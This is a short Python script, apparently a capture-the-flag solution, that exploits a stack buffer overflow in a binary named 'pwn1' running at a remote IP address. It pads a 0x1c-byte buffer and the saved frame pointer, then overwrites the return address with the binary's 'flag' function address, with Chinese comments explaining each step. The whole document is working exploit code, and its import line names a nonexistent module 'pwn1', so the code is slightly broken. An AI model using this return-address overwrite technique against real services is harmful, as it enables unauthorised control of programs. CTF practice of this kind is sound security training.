#!/usr/bin/env python
#-*- coding:utf-8 -*-

from pwn1 import *

conn = remote('39.107.92.230', 10001)
pwn_elf = ELF('pwn1')
print conn.recvline()
payload = "a" * 0x1c + "a" * 4             # 0x1c长度的buf + 4 byte的ebp
payload += p32(pwn_elf.symbols['flag']) # 覆盖ret
conn.sendline(payload)
print conn.recv()
print conn.recv()
